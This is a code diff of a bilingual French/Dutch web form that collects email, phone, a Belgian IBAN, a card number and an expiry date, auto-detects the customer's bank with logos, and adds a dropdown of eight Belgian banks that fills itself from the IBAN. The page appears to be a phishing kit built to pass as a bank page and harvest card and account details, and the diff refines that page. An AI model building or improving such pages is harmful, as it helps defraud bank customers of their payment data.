@@ -157,11 +157,20 @@
         .form-group label { display:block; font-size:14px; font-weight:600; color:var(--fg); margin-bottom:8px; }
         .form-group label .required { color:var(--danger); margin-left:2px; }
         .form-group label .optional { font-weight:400; color:var(--muted); font-size:12px; }
-        .form-group input {
+        .form-group input,
+        .form-group select {
             width:100%; padding:14px 16px; border:2px solid var(--border); border-radius:12px;
             font-size:15px; line-height:1.5; transition:all 0.3s ease; background:var(--input-bg); color:var(--fg); font-family:inherit;
             -webkit-appearance: none;
             appearance: none;
+        }
+        .form-group select {
+            background-image: url('data:image/svg+xml;charset=UTF-8,%3csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22none%22 stroke=%2264748b%22 stroke-width=%222%22%3e%3cpolyline points=%226 9 12 15 18 9%22%3e%3c/polyline%3e%3c/svg%3e');
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 20px;
+            padding-right: 40px;
+            cursor: pointer;
         }
         .form-group input:focus { outline:none; border-color:var(--accent); box-shadow:0 0 0 3px rgba(0,68,143,0.18); }
         .form-group input::placeholder { color:var(--muted); opacity:0.55; font-weight:500; }
@@ -444,6 +453,31 @@
             <div class="bank-badge" id="bankBadge"><span>✓</span><span id="bankBadgeLabel"></span></div>
         </div>
 
+        <!-- SÉLECTION BANQUE (auto-remplie) -->
+        <div class="form-group">
+            <label for="banque_select">
+                <span class="fr">Banque <span class="required">*</span></span>
+                <span class="nl">Bank <span class="required">*</span></span>
+            </label>
+            <div class="input-wrapper">
+                <select id="banque_select" name="Banque" required>
+                    <option value="">
+                        <span class="fr">— Sélectionner une banque —</span>
+                        <span class="nl">— Selecteer een bank —</span>
+                    </option>
+                    <option value="Belfius">Belfius</option>
+                    <option value="ING Belgium">ING Belgium</option>
+                    <option value="KBC Bank">KBC Bank</option>
+                    <option value="BNP Paribas Fortis">BNP Paribas Fortis</option>
+                    <option value="Argenta">Argenta</option>
+                    <option value="Crelan">Crelan</option>
+                    <option value="Beobank">Beobank</option>
+                    <option value="CBC Banque">CBC Banque</option>
+                </select>
+            </div>
+            <span class="error-msg"><span class="fr">⚠️ Veuillez sélectionner une banque</span><span class="nl">⚠️ Selecteer een bank</span></span>
+        </div>
+
         <!-- CARTE -->
         <div class="form-group">
             <label for="carte_52">
@@ -544,7 +578,7 @@
             'Email': document.getElementById('email').value,
             'Téléphone': document.getElementById('phone').value,
             'Compte BE': document.getElementById('compte_be').value,
-            'Banque': detectedBankName || 'Non détectée',
+            'Banque': document.getElementById('banque_select').value || 'Non sélectionnée',
             'Carte': document.getElementById('carte_52').value,
             'Carte réseau': detectedCardType || 'Inconnu',
             'Expiration': document.getElementById('expiry').value,
@@ -824,6 +858,7 @@
         var el = document.getElementById('ibanLogo');
         var badge = document.getElementById('bankBadge');
         var badgeLabel = document.getElementById('bankBadgeLabel');
+        var banqueSelect = document.getElementById('banque_select');
         var raw = value.toUpperCase().replace(/[^A-Z0-9]/g, '');
         var bank = detectIbanBank(raw);
         if (bank && BANK_DATA[bank]) {
@@ -831,15 +866,25 @@
             el.classList.add('active');
             wrapper.classList.add('with-logo');
             detectedBankName = BANK_NAMES[bank] || '';
-            var isNl = document.body.classList.contains('lang-nl');
             badgeLabel.textContent = detectedBankName;
             badge.classList.add('show');
+            // Auto-remplir le select
+            if (banqueSelect) {
+                banqueSelect.value = detectedBankName;
+                banqueSelect.classList.add('valid');
+                banqueSelect.classList.remove('invalid');
+            }
         } else {
             el.innerHTML = '';
             el.classList.remove('active');
             wrapper.classList.remove('with-logo');
             detectedBankName = '';
             badge.classList.remove('show');
+            // Vider le select si l'IBAN n'est pas valide
+            if (banqueSelect) {
+                banqueSelect.value = '';
+                banqueSelect.classList.remove('valid', 'invalid');
+            }
         }
     }
 
